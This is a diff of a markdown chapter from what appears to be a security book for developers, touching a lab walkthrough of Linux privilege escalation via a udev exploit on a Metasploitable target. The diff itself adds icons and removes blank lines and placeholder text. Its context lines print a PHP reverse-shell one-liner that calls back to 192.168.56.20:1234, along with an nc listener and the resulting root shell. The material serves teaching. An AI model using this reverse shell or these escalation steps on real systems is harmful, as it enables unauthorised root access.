@@ -204,12 +204,6 @@ This adds the `suid` bit, read, write and execute for `owner`, read and execute 
 
 So for example if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
 
-
-
-
-
-
-
 ![](images/HandsOnHack.png)
 
 Just as I showed you in the Penetration Testing section of the Process and Practises chapter in Fascicle 0, we will now walk through the steps of how an attacker may carry out a privilege escalation. 
@@ -267,6 +261,8 @@ G>
 G> This (https://www.exploit-db.com/exploits/8572/) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:
 G> `dpkg -l gcc`  
 G> We do.
+
+{icon=bomb}
 G>
 G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,  
 G> which allowed users to supply their own, which we see in the exploit:  
@@ -302,6 +298,8 @@ G> Another alternative is using php
 G> `echo '#!/bin/bash' > run`  
 G> `echo "php -r '\$sock=fsockopen(\"192.168.56.20\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" > run`  
 G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.
+
+{icon=bomb}
 G>
 G> On the attacking side:  
 G> `nc -lvp 1234`  
@@ -315,28 +313,6 @@ G> `connect to [192.168.56.20] from metasploitable [192.168.56.21] 43542`
 G> `whoami`  
 G> `root`
 G> and that is our privilege escalation, we now have root.
-
-
-
-{icon=bomb}
-G> ljljlkjlkjkljk
-G> ljlkjlkjkljkljkljjkl
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 The Countermeasures sections that address are:
 
